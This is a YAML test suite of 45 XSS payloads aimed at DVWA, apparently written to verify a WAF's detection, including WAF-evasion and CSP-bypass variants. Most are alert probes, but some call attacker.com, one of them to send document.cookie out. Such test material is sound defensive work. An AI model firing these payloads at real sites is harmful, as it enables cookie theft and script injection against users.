# =============================================================================
# Cross-Site Scripting (XSS) Test Cases
# =============================================================================
# DVWA의 XSS 취약점을 통해 WAF의 XSS 탐지 능력을 검증합니다.
# Reflected, Stored, DOM, mXSS, Polyglot, CSP 우회 등 45케이스
# =============================================================================

category: "xss"
name: "Cross-Site Scripting"
description: "XSS (Cross-Site Scripting) 공격 탐지 테스트 (확장판 45케이스)"
severity: "critical"
icon: "💉"

tests:
  # --- Reflected XSS ---
  - id: "xss-001"
    description: "Reflected XSS - 기본 <script>alert"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<script>alert(1)</script>"
    severity: "critical"

  - id: "xss-002"
    description: "Reflected XSS - <img onerror>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<img src=x onerror=alert(1)>'
    severity: "critical"

  - id: "xss-003"
    description: "Reflected XSS - <svg onload>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<svg onload=alert(1)>'
    severity: "critical"

  - id: "xss-004"
    description: "Reflected XSS - <body onload>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<body onload=alert(1)>'
    severity: "critical"

  - id: "xss-005"
    description: "Reflected XSS - JavaScript URI"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: 'javascript:alert(1)'
    severity: "high"

  # --- Stored XSS ---
  - id: "xss-006"
    description: "Stored XSS - <script> (Stored)"
    method: "POST"
    path: "/vulnerabilities/xss_s/"
    params:
      txtName: "<script>alert(document.cookie)</script>"
      btnSign: "Sign Guestbook"
    severity: "critical"

  - id: "xss-007"
    description: "Stored XSS - <img onerror> (Stored)"
    method: "POST"
    path: "/vulnerabilities/xss_s/"
    params:
      txtName: '<img src=x onerror=alert(document.domain)>'
      btnSign: "Sign Guestbook"
    severity: "critical"

  # --- DOM-based XSS ---
  - id: "xss-008"
    description: "DOM XSS - #<script>"
    method: "GET"
    path: "/vulnerabilities/xss_d/"
    params:
      default: "<script>alert(1)</script>"
    severity: "critical"

  - id: "xss-009"
    description: "DOM XSS - #<img onerror>"
    method: "GET"
    path: "/vulnerabilities/xss_d/"
    params:
      default: '<img src=x onerror=alert(1)>'
    severity: "critical"

  # --- WAF 우회 기법 ---
  - id: "xss-010"
    description: "XSS - 대소문자 혼합 <ScRiPt>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<ScRiPt>alert(1)</ScRiPt>"
    severity: "medium"

  - id: "xss-011"
    description: "XSS - 이중 태그 <scr<script>ipt>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<scr<script>ipt>alert(1)</scr<script>ipt>"
    severity: "medium"

  - id: "xss-012"
    description: "XSS - onfocus+javascript"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<input onfocus=alert(1) autofocus>'
    severity: "high"

  - id: "xss-013"
    description: "XSS - <details ontoggle>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<details open ontoggle=alert(1)>'
    severity: "high"

  - id: "xss-014"
    description: "XSS - <marquee onstart>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<marquee onstart=alert(1)>'
    severity: "medium"

  - id: "xss-015"
    description: "XSS - 이벤트 핸들러 다양화"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<a href="" onmouseover=alert(1)>test</a>'
    severity: "high"

  - id: "xss-016"
    description: "XSS - Hex 인코딩"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<script>eval('\\x61\\x6c\\x65\\x72\\x74(1)')</script>"
    severity: "medium"

  - id: "xss-017"
    description: "XSS - data: URI"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<a href="data:text/html;base64,PHNjcmllcHQ+YWxlcnQoMSk8L3NjcmlwdD4=">click</a>'
    severity: "high"

  - id: "xss-018"
    description: "XSS - POST Stored <script>"
    method: "POST"
    path: "/vulnerabilities/xss_s/"
    params:
      txtName: "<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>"
      btnSign: "Sign Guestbook"
    severity: "critical"

  - id: "xss-019"
    description: "XSS - <iframe srcdoc>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<iframe srcdoc="<script>alert(1)</script>">'
    severity: "high"

  - id: "xss-020"
    description: "XSS - CSS expression()"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<div style="background:url(javascript:alert(1))">'
    severity: "medium"

  # ======== [신규 확장: +25 케이스] ========

  # --- mXSS (Mutation XSS) ---
  - id: "xss-021"
    description: "mXSS - <svg><style>/*@import*/</style></svg>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<svg><style>/*@import*/<script>alert(1)</script></style></svg>'
    severity: "high"

  - id: "xss-022"
    description: "mXSS - <noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">'
    severity: "high"

  - id: "xss-023"
    description: "mXSS - <math><style><!--</style><img>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<math><style><!--</style><img src=x onerror=alert(1)>'
    severity: "high"

  # --- Polyglot XSS ---
  - id: "xss-024"
    description: "Polyglot XSS - 다중 문법 동시 만족"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '">><img src=x onerror=alert(1)><svg onload=alert(1)><script>alert(1)</script>'
    severity: "critical"

  - id: "xss-025"
    description: "Polyglot XSS - ';alert(1)//<img src=x>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "';alert(1)//<img src=x onerror=alert(1)>"
    severity: "critical"

  # --- CSP 우회 ---
  - id: "xss-026"
    description: "CSP Bypass - <base> 태그 조작"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<base href="http://attacker.com/"><script src=main.js></script>'
    severity: "high"

  - id: "xss-027"
    description: "CSP Bypass - <link rel=stylesheet>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<link rel="stylesheet" href="http://attacker.com/evil.css">'
    severity: "high"

  - id: "xss-028"
    description: "CSP Bypass - <meta http-equiv=refresh>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<meta http-equiv="refresh" content="0;url=http://attacker.com">'
    severity: "high"

  # --- 고급 이벤트 핸들러 ---
  - id: "xss-029"
    description: "XSS - <video oncanplay>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<video><source onerror=alert(1)>'
    severity: "high"

  - id: "xss-030"
    description: "XSS - <audio onloadeddata>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<audio src=x onloadeddata=alert(1)>'
    severity: "high"

  - id: "xss-031"
    description: "XSS - <object usemap>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<object usemap="#x"><map name="x"><area shape=default href="javascript:alert(1)"></map></object>'
    severity: "high"

  - id: "xss-032"
    description: "XSS - <select onfocus> 자동 포커스"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<select autofocus onfocus=alert(1)><option>'
    severity: "high"

  # --- DOM Clobbering ---
  - id: "xss-033"
    description: "DOM Clobbering - <a id=config>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<a id=config><a id=config name=api><a id=config name=api href="javascript:alert(1)">'
    severity: "medium"

  - id: "xss-034"
    description: "DOM Clobbering - <form name=body>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<form id=body><input name=innerHTML>'
    severity: "medium"

  # --- Service Worker / PWA ---
  - id: "xss-035"
    description: "XSS - importScripts ServiceWorker"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<script>navigator.serviceWorker.register('http://attacker.com/sw.js')</script>"
    severity: "critical"

  # --- Trusted Types Bypass ---
  - id: "xss-036"
    description: "XSS - Trusted Types 우회 시도"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>'</script>"
    severity: "high"

  # --- XSS via Referer / Header ---
  - id: "xss-037"
    description: "XSS - HTTP 헤더 주입 <script>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<script>alert(document.cookie)</script>"
    severity: "critical"

  # --- XSS via URI Fragment ---
  - id: "xss-038"
    description: "XSS - URL 해시 fragment"
    method: "GET"
    path: "/vulnerabilities/xss_d/"
    params:
      default: "#<img src=x onerror=alert(1)>"
    severity: "high"

  - id: "xss-039"
    description: "XSS - URL searchParams 조작"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "?name=<script>alert(1)</script>"
    severity: "critical"

  # --- WAF 우회 추가 기법 ---
  - id: "xss-040"
    description: "XSS - Unicode 분할 우회 \\u003c"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
    severity: "medium"

  - id: "xss-041"
    description: "XSS - JSFuck 인코딩"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<script>[]+[]</script>"
    severity: "medium"

  - id: "xss-042"
    description: "XSS - 태그 내 공백 변형 %09"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<img%09src=x%09onerror=alert(1)>"
    severity: "medium"

  - id: "xss-043"
    description: "XSS - 줄바꿈 %0aonerror"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: "<img src=x%0aonerror=alert(1)>"
    severity: "medium"

  - id: "xss-044"
    description: "XSS - <svg><script href>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<svg><script href="http://attacker.com/xss.js"/>'
    severity: "high"

  - id: "xss-045"
    description: "XSS - <template shadowroot>"
    method: "GET"
    path: "/vulnerabilities/xss_r/"
    params:
      name: '<template shadowroot="open"><img src=x onerror=alert(1)></template>'
    severity: "high"
